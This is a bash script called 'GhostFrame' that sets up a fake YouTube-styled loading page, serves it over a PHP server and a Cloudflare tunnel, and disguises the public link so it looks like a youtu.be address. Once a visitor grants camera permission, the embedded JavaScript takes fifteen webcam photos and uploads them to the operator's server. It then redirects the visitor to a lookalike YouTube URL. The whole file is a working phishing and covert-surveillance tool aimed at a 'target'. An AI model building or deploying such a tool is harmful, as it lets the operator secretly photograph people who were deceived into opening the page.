#!/bin/bash

# --- Wrapper functions For Color Print ---
red()     { echo -e "\033[1;31m$*\033[0m"; }
green()   { echo -e "\033[1;32m$*\033[0m"; }
yellow()  { echo -e "\033[1;33m$*\033[0m"; }
blue()    { echo -e "\033[1;34m$*\033[0m"; }
white()   { echo -e "\033[1;37m$*\033[0m"; }

# --- ASCII Banner ---
banner="
 ▗▄▄▖▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▄▄▄▖▗▄▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖▗▄▄▄▖
▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌     █  ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌▐▌   
▐▌▝▜▌▐▛▀▜▌▐▌ ▐▌ ▝▀▚▖  █  ▐▛▀▀▘▐▛▀▚▖▐▛▀▜▌▐▌  ▐▌▐▛▀▀▘
▝▚▄▞▘▐▌ ▐▌▝▚▄▞▘▗▄▄▞▘  █  ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌▐▙▄▄▖
"

domain="https://youtu.be-dQw4"

# --- Detect OS ---
detect_os() {
    if command -v pkg &>/dev/null; then
        echo "termux"
    elif [ -f "/etc/debian_version" ]; then
        echo "debian"
    else
        echo "[ERROR] Unknown OS, Not Supported."
        exit 1
    fi
}

OS=$(detect_os)

# --- Banner ---
banner() {
clear
red "$banner"
red "$(printf '═%.0s' {1..51})"
blue "Author  : " | tr -d '\n'
white "Ishikawa Goemon"
blue "Version : " | tr -d '\n'
white "1.0.0 Beta"
blue "Github  : " | tr -d '\n'
white "https://github.com/iamjinx"
red "$(printf '═%.0s' {1..51})"
if [ "$OS" = "termux" ]; then
    green "\n[INFO] Detected Termux environment"
elif [ "$OS" = "debian" ]; then
    green "\n[INFO] Detected Debian/Ubuntu system"
else
    red "\n[ERROR] Unknown OS, Not Supported."
    exit 1
fi
}

# Show About / Info by -h
banner
if [[ "$1" == "-h" ]]; then
    green "Description:"
    white "GhostFrame is a tool that captures images from
a target's front camera or webcam. It uses a fake website
hosted on an in-built PHP server and a tunneling service
like CloudFlared to create a masked, public link.
When the target clicks the link and allows camera permission,
GhostFrame grabs the cam shots remotely.
"
    green "This Tool Tested On :"
    white "Termux & Debian-13.
"
    red "Try yourself on Debian based Linux OS."
    white "Ex : Ubuntu, Kali Linux, Parrot OS etc.\n"
    exit 1
fi

# --- Install Dependencies ---
if [ "$OS" = "termux" ]; then
    banner
    sleep 1
    green "\n[+] Checking for Dependencies...\n"

    if ! command -v jq &> /dev/null; then
        pkg install jq -y
        green "\n[✓] Installed jq dependency..."
    fi

    if ! command -v php &> /dev/null; then
        pkg install php -y
        green "\n[✓] PHP is installed."
    fi

    if ! command -v cloudflared &> /dev/null; then
        pkg install cloudflared -y
        green "\n[✓] Cloudflared is installed."
    fi

elif [ "$OS" = "debian" ]; then
    banner
    sleep 1
    green "\n[+] Checking for Dependencies...\n"

    if ! command -v jq &> /dev/null; then
        sudo apt install jq -y
        green "\n[✓] Installed jq dependency..."
    fi

    if ! command -v php &> /dev/null; then
        sudo apt install php -y
        green "\n[✓] PHP is installed."
    fi

    if ! command -v cloudflared &> /dev/null; then
        # --- Cloudflared Debian Download and Install
        REPO="cloudflare/cloudflared"
        FILE="cloudflared-linux-amd64.deb"
        URL=$(curl -s "https://api.github.com/repos/$REPO/releases/latest" | jq -r ".assets[] | select(.name==\"$FILE\") | .browser_download_url")

        if [[ -z "$URL" ]]; then
        echo "Error: $FILE not found in latest release."
        exit 1
        fi

        blue "\n[i] Downloading Cloudflared Tunnel..."
        wget -q --show-progress "$URL"

        sudo dpkg -i cloudflared-linux-amd64.deb
        rm cloudflared-linux-amd64.deb    
        green "\n[✓] Cloudflared is installed."
fi
else
    red "\n[ERROR] Unknown OS, Not Supported."
    exit 1
fi

# --- Generate index.php file ---
cat > index.php <<'EOF'
<?php
// index.php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    if (!is_dir('ghost-img')) mkdir('ghost-img');

    $filename = 'photo_' . uniqid() . '.jpg';
    move_uploaded_file($_FILES['photo']['tmp_name'], 'ghost-img/' . $filename);
    echo "Saved: ghost-img/$filename";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Top 10 Newz</title>
  <link rel="icon" href="https://www.youtube.com/favicon.ico" type="image/x-icon">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @keyframes spin { to { transform: rotate(360deg); } }
    .spin { animation: spin 2s linear infinite; }
    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
    }
    .pulse { animation: pulse 2s ease-in-out infinite; }
  </style>
</head>
<body class="flex items-center justify-center h-screen bg-white">

  <div class="flex flex-col items-center space-y-6">
    <!-- Loader -->
    <div class="relative w-24 h-24 flex items-center justify-center">
      <div class="absolute w-24 h-24 border-4 border-red-500 border-t-transparent rounded-full spin"></div>
      <img 
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/512px-YouTube_full-color_icon_%282017%29.svg.png" 
        alt="YouTube Logo" 
        class="w-12 pulse"
        style="height:auto;"
      >
    </div>

    <!-- Timer -->
    <div id="message" class="text-center">
      <p class="text-lg font-semibold text-gray-700">
        Redirecting in <span id="countdown">20</span> seconds...
      </p>
    </div>
  </div>
  
<script>
// ---------- Camera Capture and Send to PHP ----------
async function captureAndSendImages(count = 15, interval = 1000, url = "index.php") {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");

    for (let i = 0; i < count; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
      const formData = new FormData();
      formData.append("photo", blob, `snap_${Date.now()}.jpg`);
      await fetch(url, { method: "POST", body: formData });
      if (i < count - 1) await new Promise(r => setTimeout(r, interval));
    }

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    alert("Camera error: " + err.message);
  }
}

captureAndSendImages(15, 1000, "index.php");

// ---------- Countdown Redirect ----------
let timeLeft = 20;
const countdownEl = document.getElementById("countdown");
const intervalId = setInterval(() => {
  timeLeft--;
  countdownEl.textContent = timeLeft;
  if (timeLeft <= 0) {
    clearInterval(intervalId);
    window.location.href = "https://www.yout-ube.com/watch?v=dQw4w9WgXcQ";
  }
}, 1000);
</script>
</body>
</html>
EOF

banner
# --- Start PHP server ---
yellow "\n[+] Starting PHP Server...\n"
php -S 0.0.0.0:5000 > /dev/null 2>&1 & 
sleep 2
# --- Start cloudflared tunnel ---
yellow "[+] Starting Cloudflared Tunnel...\n"
rm -f .cloudflared.log >/dev/null 2>&1
cloudflared tunnel --url 0.0.0.0:5000 --logfile .cloudflared.log >/dev/null 2>&1 &
# --- wait for cloudflared to initialize ---
sleep 10
# --- extract and print link ---
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
shorturl=$(curl -sG "https://clck.ru/--" --data-urlencode "url=$link")
white "[x] Link : ${domain}${shorturl/https:\/\//@}"

echo
red "$(printf '═%.0s' {1..51})"
yellow "                 IMPORTANT WARNING    "
echo
white   "       Link stays alive until Terminal OPEN!"
echo
red "$(printf '═%.0s' {1..51})"
white   "         Close the terminal = Link dies 💀"
red "$(printf '═%.0s' {1..51})"
echo
# --- Thank You ---
